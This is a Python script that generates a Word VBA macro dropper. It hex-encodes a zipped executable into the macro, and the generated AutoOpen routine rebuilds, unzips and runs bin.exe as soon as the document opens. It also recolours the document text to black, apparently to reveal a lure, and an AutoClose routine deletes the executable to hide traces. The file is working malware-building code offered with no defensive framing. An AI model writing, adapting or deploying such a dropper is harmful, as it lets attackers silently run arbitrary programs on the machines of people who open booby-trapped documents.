import zipfile
from binascii import hexlify
from zipfile import ZipFile


def sub_auto_open_part_one() -> str:
    return f'''
Sub AutoOpen()
    Dim pathName  As String
    Dim zipFileName As String
    Dim coll As Object
    Dim toFile
    Dim MyChar

    ActiveDocument.Range.Font.ColorIndex = vbBlack
    
    pathName = ActiveDocument.AttachedTemplate.path
    zipFileName = pathName + "\\bin.zip"
    Set coll = CreateObject("System.Collections.ArrayList")
'''


def sub_auto_open_part_two() -> str:
    return f'''
    Open zipFileName For Output As #1
    For Each elem In coll
        arr = Split(elem, "|")
        For Each hexStr In arr
            toFile = toFile + HexToString(CStr(hexStr))
        Next
    Next
    Print #1, toFile
    Close #1
    
    Call UnzipAFile(pathName)
    Dim binFileName As String
    binFileName = pathName + "\\exe\\bin.exe"
    Call Shell(binFileName, vbNormalFocus)
End Sub'''


def sub_unzip_a_file() -> str:
    return f'''
Sub UnzipAFile(pathName As String)
    Dim File        As Object
    Dim Files       As Object
    Dim MainFldr    As Object
    Dim MainPath    As Variant
    Dim oShell      As Object
    Dim ZipFile     As Variant
    Dim ZipFldr     As Object
    
        MainPath = pathName
        
        Set oShell = CreateObject("Shell.Application")
            
        Set MainFldr = oShell.Namespace(MainPath)
        
            Set Files = MainFldr.Items
                Files.Filter 32, "*.zip"  
            For Each File In Files
                Set ZipFldr = oShell.Namespace(File)
                For Each ZipFile In ZipFldr.Items
                    MainFldr.CopyHere ZipFile.path
                Next ZipFile
            Next File         
End Sub'''


def sub_delete_file() -> str:
    return f'''
Sub DeleteFile(ByVal FileToDelete As String)
   If (Dir(FileToDelete) <> "") Then
      SetAttr FileToDelete, vbNormal
      Kill FileToDelete
   End If
End Sub'''


def function_hex_to_string() -> str:
    return f'''
Private Function HexToString(Value As String)
    Dim szTemp As String
    szTemp = Value
    Dim szData As String
    szData = ""
    While Len(szTemp) > 0
        szData = Chr(CLng("&h" & Right(szTemp, 2))) & szData
        If (Len(szTemp) = 1) Then
            szTemp = Left(szTemp, Len(szTemp) - 1)
        Else
            szTemp = Left(szTemp, Len(szTemp) - 2)
        End If
    Wend
    HexToString = szData
End Function'''


def sub_auto_close() -> str :
    return f'''
Sub AutoClose()
    fileName = ActiveDocument.AttachedTemplate.path + "\\bin.exe"
    DeleteFile (fileName)
End Sub
'''


def file2hex(input_file, output_file):

    print (input_file)
    zip_file = 'zip/temp.zip'

    with ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zipObj2:
        zipObj2.write(input_file)

    with open(zip_file, "rb") as fd_in, open(output_file, "w") as fd_out:
        fd_out.write(sub_auto_open_part_one())
        count_str = 0
        count_hex = 0
        while chunk := fd_in.read(128):
            count_str = count_str + 1
            split_strings = [hexlify(chunk)[i:i + 2] for i in range(0, len(hexlify(chunk)), 2)]
            _string = f''' "'''
            for hex_var in split_strings:
                hex_value = str(hex_var)[2:][:-1]
                _string = _string + hex_value
                count_hex = count_hex + 1
                _string = _string + '|'
            # print("String N_" + str(count_str))
            _string = _string[:-1] + '"\n'
            _string = '\tcoll.Add ' + _string
            # print(_string)
            fd_out.write(_string)

        fd_out.write(sub_auto_open_part_two())
        fd_out.write(sub_unzip_a_file())
        fd_out.write(sub_delete_file())
        fd_out.write(function_hex_to_string())
        fd_out.write(sub_auto_close())


if __name__ == '__main__':
    file2hex(f"""exe/bin.exe.exe""", f"""hex/m.VBA""")
